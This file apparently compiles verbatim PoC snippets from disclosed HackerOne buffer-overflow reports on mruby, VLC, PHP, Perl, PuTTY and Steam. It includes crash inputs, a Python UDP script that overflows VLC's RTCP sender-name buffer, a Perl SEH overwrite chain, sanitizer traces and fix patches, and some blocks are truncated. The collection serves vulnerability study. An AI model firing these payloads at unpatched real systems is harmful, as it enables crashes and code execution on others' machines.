# Buffer overflow / OOB write — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #188326 Buffer overflow in mrb_time_asctime — shopify-scripts — $10,000 — Uncontrolled Resource Consumption
Source: `hackerone/reports/2016/188326.md` (https://hackerone.com/reports/188326)

```
Time.new-0XD00000000000000&0
```

```
 $ ./dev/bin/mruby crash.rb
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 66222 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)
Process 66222 exited with status = 1 (0x00000001)
(lldb) r
Process 66665 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 66665 exited with status = 1 (0x00000001)
(lldb) r
Process 66889 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 66889 exited with status = 1 (0x00000001)
(lldb) r
Process 67075 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 01 16:03:04 1900 (NoMethodError)
Process 67075 exited with status = 1 (0x00000001)
(lldb) r
Process 67127 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun _defined? 486 16:03:04 2259 (NoMethodError)
Process 67127 exited with status = 1 (0x00000001)
(lldb) r
Process 67341 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 04 16:03:04 1900 (NoMethodError)
Process 67341 exited with status = 1 (0x00000001)
(lldb) r
Pro
```

## #1180252 Buffer overrun in Steam SILK voice decoder — valve — $7,500 — Classic Buffer Overflow
Source: `hackerone/reports/2021/1180252.md` (https://hackerone.com/reports/1180252)

```
8 bytes - steamid
1 byte - payload type
2 bytes - payload size
<payload data>
4 bytes - CRC checksum
```

```
unsigned int VoiceEncoder_SILK::Decode( const char* pPayloadData, size_t nPayloadSize, char* pDestBuffer, size_t nDestBufferSize )
{
	m_decControl.API_sampleRate = m_nSampleRate;
	int nSamplesInFrame = 20 * m_nSampleRate / 1000;
	int nBytesInFrame = 2 * nSamplesInFrame;
	
	const char* pPayloadCurr = pPayloadData;
	const char* pPayloadEnd = pPayloadData + pPayloadSize;
	
	char* pDestCurr = pDestBuffer;
	char* pDestEnd = pDestBuffer + nDestBufferSize;
	
	while ( pPayloadCurr < pPayloadEnd )
	{
		unsigned short nSize = *(short*)pPayloadCurr;
		pPayloadCurr += 2;
		if ( nSize == 0xFFFF )
		{
			return ( pDestCurr - pDestBuffer ) / 2;
		}
		
		if ( nSize )
		{
			//  [1] Make sure we're not reading past end of our input
			if ( pPayloadCurr + nSize > pPayloadEnd )
				break;
			
			//  [2] Make sure we have enough room in output for a full frame
			if ( pDestCurr + 2 * nBytesInFrame > pDestEnd )
				break;
			
			// Zero out the frame
			memset( pDestCurr, 0, nBytesInFrame );
			
			do
			{
				unsigned short nDecodedSamples = ( pDestCurr - pDestBuffer ) / 2;
				SKP_Silk_SDK_Decode( m_pDecoder, &m_decControl, 0, pPayloadCurr, nSize, pDestCurr, &nDecodedSamples );
				
				pPayloadCurr += nSize;
				pDestCurr += 2 * nDecodedSamples;
				
				Assert( m_decControl.moreInternalDecoderFrames == 0 ); // [3] We shouldn't get this condition in normal contexts
			}
			while ( m_decControl.moreInternalDecoderFrames );
		}
		else
		{
			pDestCurr += nBytesInFrame;
		}
	}
	
	return ( pDestCu
```

## #630462 Heap overflow happen when receiving short length key from ssh server using ssh protocol 1 — putty_h1c — $3,645.90 — Heap Overflow
Source: `hackerone/reports/2019/630462.md` (https://hackerone.com/reports/630462)

```
    #0 0x45c487 (/root/putty-0.71/plink+0x45c487)
    #1 0x4ceb78 (/root/putty-0.71/plink+0x4ceb78)
    #2 0x4d23a6 (/root/putty-0.71/plink+0x4d23a6)
    #3 0x4051d5 (/root/putty-0.71/plink+0x4051d5)
    #4 0x40562e (/root/putty-0.71/plink+0x40562e)
    #5 0x53d25a (/root/putty-0.71/plink+0x53d25a)
    #6 0x7f402cfe0c04 (/usr/lib64/libc-2.17.so+0x21c04)
    #7 0x4037f8 (/root/putty-0.71/plink+0x4037f8)
```

```
    #0 0x7f402d59b4ba (/usr/lib64/libasan.so.0+0x154ba)
    #1 0x4218b1 (/root/putty-0.71/plink+0x4218b1)
    #2 0x45bf1d (/root/putty-0.71/plink+0x45bf1d)
    #3 0x4ceb78 (/root/putty-0.71/plink+0x4ceb78)
    #4 0x4d23a6 (/root/putty-0.71/plink+0x4d23a6)
    #5 0x4051d5 (/root/putty-0.71/plink+0x4051d5)
    #6 0x40562e (/root/putty-0.71/plink+0x40562e)
    #7 0x53d25a (/root/putty-0.71/plink+0x53d25a)
    #8 0x7f402cfe0c04 (/usr/lib64/libc-2.17.so+0x21c04)
```

## #489102 VLC 4.0.0 - Stack Buffer Overflow (SEH) — vlc_h1c — $2,817.28 — Stack Overflow
Source: `hackerone/reports/2020/489102.md` (https://hackerone.com/reports/489102)

```
/** Sender name is set to max length of MAX_CNAME (128), line: 446 **/
char new_sender_name[MAX_CNAME];

/** name_length is read from the RTSP header, line: 489 **/
int8_t name_length = rtcp_sdes_get_name_length(buf);

/** memcpy new_sender_name with name_length bytes, line: 525 **/
memcpy(new_sender_name, buf + RTCP_SDES_SIZE, name_length);
```

```
#!/usr/bin/python
import socket

server = ("192.168.0.23", 8889)
udp = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

bufsize = "\x80" # Amounts of bytes we want read into new_sender_name (128 bytes)

buf = "\x80"                  # Version and padding
buf += "\xCA"                 # packet type = RTCP_PT_SDES
buf += "\x00\x00"             # Record length
buf += "\x00\x00\x00\x00\x00" # SDES record
buf += bufsize                # Buffer size of name 9-10 bit

# 64 bit
buf += "A" * 232 + "B" * 8 + "C" * 8 + "D" * 200 # Buffer for new_sender_name

# 32 bit
#buf += "A" * 568 + "B" * 4 + "C" * 4 + "D" * 50 # Buffer for new_sender_name

udp.sendto(buf, server)
```

```
if (name_length > bytes_left)
```

## #593229 Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow — ibb — $1,500 — Buffer Over-read
Source: `hackerone/reports/2020/593229.md` (https://hackerone.com/reports/593229)

```
for (str_left = str_nbytes; str_left > 0; str_left--, p1++) {
```

```
int qmarks = 2;
while (qmarks > 0 && str_left > 1) {
    if (*(++p1) == '?') {
        --qmarks;
    }
    --str_left;
}
```

```
if (*(p1 + 1) == '=') {
    ++p1;
    --str_left;
}
```

## #1084342 Buffer overflow in PyCArg_repr in _ctypes/callproc.c for Python 3.x to 3.9.1 — ibb — $1,500 — Classic Buffer Overflow
Source: `hackerone/reports/2021/1084342.md` (https://hackerone.com/reports/1084342)

```
    case 'd':
        sprintf(buffer, "<cparam '%c' (%f)>",
            self->tag, self->value.d);
        break;
```

```
    MISC:https://bugs.python.org/issue42938
    MISC:https://github.com/python/cpython/pull/24239
    MISC:https://python-security.readthedocs.io/vuln/ctypes-buffer-overflow-pycarg_repr.html
```

## #478368 imagecolormatch Out Of Bounds Write on Heap  — ibb — $1,500 — Memory Corruption - Generic
Source: `hackerone/reports/2020/478368.md` (https://hackerone.com/reports/478368)

```
The buffer is then written to in a for loop.
	for (x=0; x<im1->sx; x++) {
		for( y=0; y<im1->sy; y++ ) {
			color = im2->pixels[y][x];
			rgb = im1->tpixels[y][x];
			bp = buf + (color * 5);
			(*(bp++))++;
			*(bp++) += gdTrueColorGetRed(rgb);
			*(bp++) += gdTrueColorGetGreen(rgb);
			*(bp++) += gdTrueColorGetBlue(rgb);
			*(bp++) += gdTrueColorGetAlpha(rgb);
		}

The buffer is written to by means of a color being the index:
color = im2->pixels[y][x];
..
bp = buf + (color * 5);
```

```
$img1 = imagecreatetruecolor(0xfff, 0xfff);
$img2 = imagecreate(0xfff, 0xfff);
imagecolorallocate($img2, 0, 0, 0);
imagesetpixel($img2, 0, 0, 255);
imagecolormatch($img1, $img2);
```

## #272497 Perl $ENV Key Stack Buffer Overflow — ibb — $1,500 — Stack Overflow
Source: `hackerone/reports/2019/272497.md` (https://hackerone.com/reports/272497)

```
    char szBuffer[1024];
    LPSTR *lpPtr;
    int index, length = strlen(lpStr)+1;
```

```
    for(index = 0; lpStr[index] != '\0' && lpStr[index] != '='; ++index)
    szBuffer[index] = lpStr[index];
```

```
    "\x41\x41\x41\x41" .
    "\x78\x6e\x3b\x6e" .    # perl526!exit (6E3B6E78)
    "\x43\x43\x43\x43" .
    "\x4e\x1d\x1e\x03" .    # exit code (52305230)
    "\x45\x45\x45\x45" . 
    "\x46\x46\x46\x46" . 
    "\x47\x47\x47\x47" . 
    "\x30\x2c\x3a\x6e";     # perl526!win32_getpid (6e3a2c30)
```

## #476179 Buffer over-write in finfo_open with malformed magic file. — ibb — $1,500 — Heap Overflow
Source: `hackerone/reports/2020/476179.md` (https://hackerone.com/reports/476179)

```
    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:245
```

```
    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:821
```

```
    format=format@entry=0x1188930 "Failed to load magic database at '%s'.", args=args@entry=0x7fffffff9e30) at /root/php-src/main/main.c:786
```

## #175587 Stack Buffer Overflow in GD dynamicGetbuf — ibb — $1,500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/175587.md` (https://hackerone.com/reports/175587)

```
2227                 io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data), Z_STRVAL_P(data), 0);
```

```
280                 dp->logicalSize = initialSize;
```

```
	254             unsigned char b;
	255             int rv;
	256
	257             rv = dynamicGetbuf (ctx, &b, 1);
```

## #535827 Buffer overflow in yywarning_s — shopify-scripts — $1,000 — Classic Buffer Overflow
Source: `hackerone/reports/2019/535827.md` (https://hackerone.com/reports/535827)

```
300000000000000000000000000000000000000000000000E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

```
diff --git a/mrbgems/mruby-compiler/core/parse.y b/mrbgems/mruby-compiler/core/parse.y
index cb62ec3f..82df8c08 100644
--- a/mrbgems/mruby-compiler/core/parse.y
+++ b/mrbgems/mruby-compiler/core/parse.y
@@ -3759,10 +3759,15 @@ static void
 yywarning_s(parser_state *p, const char *msg, const char *s)
 {
   char buf[256];
-
-  strcpy(buf, msg);
-  strcat(buf, ": ");
-  strcat(buf, s);
+  const char delim[] = ": ";
+
+  if (strlen(msg) + strlen(s) + strlen(delim) + 1 > sizeof(buf)) {
+      strcpy(buf, msg);
+  } else {
+      strcpy(buf, msg);
+      strcat(buf, delim);
+      strcat(buf, s);
+  }
   yywarning(p, buf);
 }
```

## #633607 Invalid read in `str_replace_partial` — shopify-scripts — $1,000 — Out-of-bounds Read
Source: `hackerone/reports/2019/633607.md` (https://hackerone.com/reports/633607)

```
0==27051== Invalid read of size 1
==27051==    at 0x483FA10: memmove (vg_replace_strmem.c:1270)
==27051==    by 0x135D60: str_replace_partial (string.c:1193)
==27051==    by 0x1359CB: mrb_str_aset (string.c:1226)
==27051==    by 0x131AE8: mrb_str_aset_m (string.c:1255)
==27051==    by 0x1656FE: mrb_f_send (vm.c:633)
==27051==    by 0x169C3E: mrb_vm_exec (vm.c:1441)
==27051==    by 0x166540: mrb_vm_run (vm.c:949)
==27051==    by 0x17A5C7: mrb_top_run (vm.c:2837)
==27051==    by 0x153113: mrb_load_exec (parse.y:6318)
==27051==    by 0x1533E6: mrb_load_file_cxt (parse.y:6327)
==27051==    by 0x10DC3C: main (mruby.c:270)
==27051==  Address 0x4da9370 is 176 bytes inside an unallocated block of size 2,796,832 in arena "client"
```

## #170138 SEH buffer overflow msgfmt_format_message — ibb — $1,000 — Memory Corruption - Generic
Source: `hackerone/reports/2019/170138.md` (https://hackerone.com/reports/170138)

```
http://git.php.net/?p=php-src.git;a=commit;h=20fa323d53257a776bd7551ce7bdb2261cfe5420
```

```
PHP_FUNCTION( msgfmt_format_message )
{
    zval       *args;
    UChar      *spattern = NULL;
    int         spattern_len = 0;
    char       *pattern = NULL;
    size_t      pattern_len = 0;
    const char *slocale = NULL;
    size_t      slocale_len = 0;
    MessageFormatter_object mf;
    MessageFormatter_object *mfo = &mf;

    /* Parse parameters. */
    if( zend_parse_method_parameters( ZEND_NUM_ARGS(), getThis(), "ssa",
          &slocale, &slocale_len, &pattern, &pattern_len, &args ) == FAILURE )
    {
        intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,
            "msgfmt_format_message: unable to parse input params", 0 );

        RETURN_FALSE;
    }

    memset(mfo, 0, sizeof(*mfo));
    msgformat_data_init(&mfo->mf_data);

    if(pattern && pattern_len) {
        intl_convert_utf8_to_utf16(&spattern, &spattern_len, pattern, pattern_len, &INTL_DATA_ERROR_CODE(mfo));
```

```
<?php

ini_set('memory_limit', -1);

$v1 = str_repeat("ABCE", 503566756/3);
$v2 = "test";
$v3 = [];

MessageFormatter::formatMessage($v1, $v2, $v3);
// msgfmt_format_message($v1, $v2, $v3);
```

## #110352 Perl 5.22 VDir::MapPathA/W Out-of-bounds Reads and Buffer Over-reads — ibb — $1,000 — Memory Corruption - Generic
Source: `hackerone/reports/2016/110352.md` (https://hackerone.com/reports/110352)

```
    inline int DriveIndex(char chr)
    {
```

```
     * possiblities -- relative path or absolute path with or without drive letter
     * OR UNC name
     */
    [...]
```

```
    inline const char *GetDirA(int index)
    {
```

## #295380 heap-buffer-overflow in OP_R_BREAK — shopify-scripts — $800 — Heap Overflow
Source: `hackerone/reports/2018/295380.md` (https://hackerone.com/reports/295380)

```
def z
	e Array = a rescue 
	lambda { yield }
end

z { break } 

Array[]
```

```
./mruby/bin/mirb 2084_out.rb
mirb - Embeddable Interactive Ruby Shell

 => :z
 => nil
(mirb):6: undefined method 'e' for main (NoMethodError)
 => nil
=================================================================
==15861==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e000000c38 at pc 0x00010a4b569c bp 0x7ffee57faad0 sp 0x7ffee57faac8
READ of size 8 at 0x61e000000c38 thread T0
    #0 0x10a4b569b in mrb_vm_exec vm.c:2084
    #1 0x10a499ce4 in mrb_vm_run vm.c:930
    #2 0x10a3fe30d in main mirb.c:567
    #3 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

0x61e000000c38 is located 72 bytes to the left of 2560-byte region [0x61e000000c80,0x61e000001680)
allocated by thread T0 here:
    #0 0x10a8562d0 in wrap_realloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x592d0)
    #1 0x10a486225 in mrb_default_allocf state.c:55
    #2 0x10a599c68 in mrb_realloc_simple gc.c:206
    #3 0x10a59a42a in mrb_realloc gc.c:220
    #4 0x10a59af03 in mrb_malloc gc.c:242
    #5 0x10a59af9d in mrb_calloc gc.c:260
    #6 0x10a48e9c5 in stack_init vm.c:131
    #7 0x10a48b11b in mrb_funcall_with_block vm.c:415
    #8 0x10a48aa19 in mrb_funcall_with_block vm.c:393
    #9 0x10a48a147 in mrb_funcall_argv vm.c:498
    #10 0x10a4475f1 in mrb_obj_new class.c:1601
    #11 0x10a539cf5 in mrb_exc_new_str error.c:32
    #12 0x10a5433b1 in mrb_init_exception error.c:506
    #13 0x10a488f24 in mrb_init_core init.c:42
    #14 0x10a4861b7 in mrb_open_core state.c:42
    #15 0x10a48638c in mrb_
```

```
    #0 0x10a4b569b in mrb_vm_exec vm.c:2084
    #1 0x10a499ce4 in mrb_vm_run vm.c:930
    #2 0x10a3fe30d in main mirb.c:567
    #3 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)
```

## #194906 Heap overflow due to off-by-one when expanding stack — shopify-scripts — $800 — Memory Corruption - Generic
Source: `hackerone/reports/2017/194906.md` (https://hackerone.com/reports/194906)

```
class A
yield ensure 0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g>>=0.g
end.g>>=g>>=s0>>=e=_=0.g>>=0>p>>=sg>>=0..0>u>>=0..0>a>>=ab|=0..0>r>>=0>e0>>=i>>=0..0>r0>>=a00>ry>>=u0>>=0..0>x>>=0.g>>=0>0|ü|=0..0>r00>>=y>>=t>>=up=sy>>=s00>>=0..0>ug>>=f>>=0>0>>0.g>>=0>a0>>=0.g>>=0>s>>=0..0>0.g>>=0>0.g>>=super
```

```
=================================================================
==7397==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000017900 at pc 0x0000004ae8ac bp 0x7fff42c9a9d0 sp 0x7fff42c9a180
WRITE of size 16 at 0x621000017900 thread T0
    #0 0x4ae8ab in __asan_memcpy (/vagrant/bin/mruby+0x4ae8ab)
    #1 0x64b513 in stack_clear /vagrant/src/vm.c:68:15
    #2 0x64b1ea in init_new_stack_space /vagrant/src/vm.c:127:5
    #3 0x617dc0 in stack_extend /vagrant/src/vm.c:174:3
    #4 0x61e214 in mrb_vm_run /vagrant/src/vm.c:770:3
    #5 0x618344 in mrb_run /vagrant/src/vm.c:2481:10
    #6 0x647f5b in ecall /vagrant/src/vm.c:297:3
    #7 0x62f830 in mrb_vm_exec /vagrant/src/vm.c:1561:15
    #8 0x61e2eb in mrb_vm_run /vagrant/src/vm.c:772:10
    #9 0x64a628 in mrb_top_run /vagrant/src/vm.c:2491:12
    #10 0x674229 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #11 0x674ec5 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #12 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #13 0x7f2d32996f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #14 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x621000017900 is located 0 bytes to the right of 4096-byte region [0x621000016900,0x621000017900)
allocated by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5bfde5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x550396 in mr
```

```
From 7a197ff7c87a4c1db1a686bad49c5d42f9044c12 Mon Sep 17 00:00:00 2001
From: Jonathan Rudenberg <jonathan@titanous.com>
Date: Fri, 30 Dec 2016 21:15:23 -0500
Subject: [PATCH] Fix off-by-one when expanding stack with keep>0

---
 src/vm.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/src/vm.c b/src/vm.c
index 368b75a9..051c3b83 100644
--- a/src/vm.c
+++ b/src/vm.c
@@ -124,7 +124,7 @@ init_new_stack_space(mrb_state *mrb, int room, int keep)
 {
   if (room > keep) {
     /* do not leave uninitialized malloc region */
-    stack_clear(&(mrb->c->stack[keep]), room - keep);
+    stack_clear(&(mrb->c->stack[keep]), room - keep - 1);
   }
 }
 
-- 
2.11.0
```

## #295680 Invalid read leading to a segfault — shopify-scripts — $800 — Out-of-bounds Read
Source: `hackerone/reports/2017/295680.md` (https://hackerone.com/reports/295680)

```
    423│ dispatch_linked(codegen_scope *s, int pc)
    424│ {
    425│   mrb_code i;
    426│   int pos;
    427│
    428│   if (!pc) return;
    429│   for (;;) {
    430├───> i = s->iseq[pc];
```

```
    ==21952== Memcheck, a memory error detector
    ==21952== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
    ==21952== Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info
    ==21952== Command: mruby 2.rb
    ==21952== 
    ==21952== Invalid read of size 4
    ==21952==    at 0x17E1C2: dispatch_linked (codegen.c:430)
    ==21952==    by 0x177D68: codegen (codegen.c:1374)
    ==21952==    by 0x17F988: lambda_body (codegen.c:738)
    ==21952==    by 0x17D635: codegen (codegen.c:2767)
    ==21952==    by 0x17792C: codegen (codegen.c:1314)
    ==21952==    by 0x17E72E: scope_body (codegen.c:767)
    ==21952==    by 0x178B40: codegen (codegen.c:1624)
    ==21952==    by 0x1770BC: mrb_generate_code (codegen.c:3049)
    ==21952==    by 0x14C353: mrb_load_exec (parse.y:5815)
    ==21952==    by 0x14C8F6: mrb_load_file_cxt (parse.y:5849)
    ==21952==    by 0x10CD82: main (mruby.c:227)
    ==21952==  Address 0x5df11a8 is 65,816 bytes inside a block of size 131,072 free'd
    ==21952==    at 0x4C2F13F: realloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
    ==21952==    by 0x140295: mrb_default_allocf (state.c:55)
    ==21952==    by 0x10D6BC: mrb_realloc_simple (gc.c:206)
    ==21952==    by 0x17DAF7: codegen_realloc (codegen.c:136)
    ==21952==    by 0x17DCA1: genop (codegen.c:154)
    ==21952==    by 0x17CC20: codegen (codegen.c:2600)
    ==21952==    by 0x17FE50: gen_call (codegen.c:893)
    ==21952==    by 0x178B65: codegen (codege
```

## #192362 Heap Overflow in mrb_arb_splice — shopify-scripts — $800 — Memory Corruption - Generic
Source: `hackerone/reports/2017/192362.md` (https://hackerone.com/reports/192362)

```
ary = Array.new(1023)
ary[0x7ffffffffffffc00,0] = Array.new(1024)
```

```
$ gdb -q --args ./bin/mruby test2.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test2.rb

Program received signal SIGSEGV, Segmentation fault.
0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104
104         *ptr++ = nil;
(gdb) list
99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)
100     {
101       mrb_value nil = mrb_nil_value();
102
103       while (size--) {
104         *ptr++ = nil;
105       }
106     }
107
108     static void
(gdb) bt
#0  0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104
#1  0x0000000000415fd1 in mrb_ary_splice (mrb=0xdd7010, ary=..., head=9223372036854774784, len=-9223372036854773761, rpl=...)
    at /home/tunz/working/mruby/mruby/src/array.c:626
#2  0x00000000004165be in mrb_ary_aset (mrb=0xdd7010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:808
#3  0x0000000000430c09 in mrb_vm_exec (mrb=0xdd7010, proc=0xdda210, pc=0xe3f03c) at /home/tunz/working/mruby/mruby/src/vm.c:1171
#4  0x000000000042f121 in mrb_vm_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:772
#5  0x0000000000437199 in mrb_top_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:2487
#6  0x0000000000447847 in mrb_load_exec (mrb=0xdd7010, p=0x
```

```
 581 MRB_API mrb_value
 582 mrb_ary_splice(mrb_state *mrb, mrb_value ary, mrb_int head, mrb_int len, mrb_value rpl)
 583 {
...
 619   size = head + argc; // size is calculated here, and can be overflow
 620
 621   if (tail < a->len) size += a->len - tail;
 622   if (size > a->aux.capa) // then, bypass this condition
 623     ary_expand_capa(mrb, a, size);
 624
 625   if (head > a->len) {
 626     ary_fill_with_nil(a->ptr + a->len, head - a->len); // heap overflow since capa is still small. 
 627   }
...
```

## #197719 Still heap overflow in mrb_ary_splice — shopify-scripts — $800 — Uncontrolled Resource Consumption
Source: `hackerone/reports/2017/197719.md` (https://hackerone.com/reports/197719)

```
ary = Array.new(1024)
ary[0x7ffffffffffffc00,1024] = Array.new(1024)
```

```
$ gdb -q --args ./bin/mruby test10.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test10.rb
1024

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361) at /home/tunz/working/mruby/mruby/src/array.c:104
104         *ptr++ = nil;
(gdb) bt
#0  0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361)
    at /home/tunz/working/mruby/mruby/src/array.c:104
#1  0x00000000004160e6 in mrb_ary_splice (mrb=0x225e010, ary=..., head=9223372036854774784, len=1024, rpl=...)
    at /home/tunz/working/mruby/mruby/src/array.c:639
#2  0x00000000004166d3 in mrb_ary_aset (mrb=0x225e010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:821
#3  0x0000000000430fd5 in mrb_vm_exec (mrb=0x225e010, proc=0x22611b0, pc=0x22c61bc) at /home/tunz/working/mruby/mruby/src/vm.c:1174
#4  0x000000000042f47b in mrb_vm_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:772
#5  0x0000000000437599 in mrb_top_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:2491
#6  0x0000000000447c47 in mrb_load_exec (mrb=0x225e010, p=0x22ba450, c=0x22b90c0)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#7  0x0000000000447cdd in mrb_load_file_cxt (mrb=0x225e010, f=0x22ba090, c=0x22b90c0)
    at /home/tunz/working/mru
```

```
    at /home/tunz/working/mruby/mruby/src/array.c:104
```

## #209449 Heap buffer overflow with long array assignment — shopify-scripts — $800 — Uncontrolled Resource Consumption
Source: `hackerone/reports/2017/209449.md` (https://hackerone.com/reports/209449)

```
[][]=%

[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]-=0
```

```
=================================================================
==7193==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d00001e888 at pc 0x00000062a87f bp 0x7ffed3653990 sp 0x7ffed3653988
WRITE of size 4 at 0x61d00001e888 thread T0
    #0 0x62a87e in mrb_vm_exec /vagrant/src/vm.c:1164:9
    #1 0x622c5b in mrb_vm_run /vagrant/src/vm.c:815:10
    #2 0x650048 in mrb_top_run /vagrant/src/vm.c:2573:12
    #3 0x679f89 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #4 0x67ac25 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #5 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #6 0x7f11f1720f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #7 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x61d00001e888 is located 8 bytes to the right of 2048-byte region [0x61d00001e080,0x61d00001e880)
allocated by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5c2cc5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x5503e6 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x550a34 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x551373 in mrb_malloc /vagrant/src/gc.c:236:10
    #5 0x55140d in mrb_calloc /vagrant/src/gc.c:254:9
    #6 0x61add9 in stack_init /vagrant/src/vm.c:97:28
    #7 0x618208 in mrb_funcall_with_block /vagrant/src/vm.c:376:7
    #8 0x617c22 in mrb_funcall_with_block /vagrant/src/vm.c:354:13
    #9 0x
```

```
    #0 0x62a87e in mrb_vm_exec /vagrant/src/vm.c:1164:9
    #1 0x622c5b in mrb_vm_run /vagrant/src/vm.c:815:10
    #2 0x650048 in mrb_top_run /vagrant/src/vm.c:2573:12
    #3 0x679f89 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #4 0x67ac25 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #5 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #6 0x7f11f1720f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #7 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)
```

## #724243 Tcpdump before 4.9.3 has a buffer over-read in print-802_11.c (CVE-2018-16227) — ibb — $500 — Out-of-bounds Read
Source: `hackerone/reports/2020/724243.md` (https://hackerone.com/reports/724243)

```
CVE-2018-16227,tcpdump,ieee802.11_meshhdr-oobr.pcap,"Ryan Ackroyd",2018/05/26,Y,4846b3c5d0a850e860baf4f07340495d29837d09,4.9.3,,
```

```
tcpdump -e -vvvv -H -u -nn -r fuzzer06:id:000021,sig:11,src:008627,op:havoc,rep:2
```

```
reading from file fuzzer06:id:000021,sig:11,src:008627,op:havoc,rep:2, link-type IEEE802_11_RADIO (802.11 plus radiotap header)
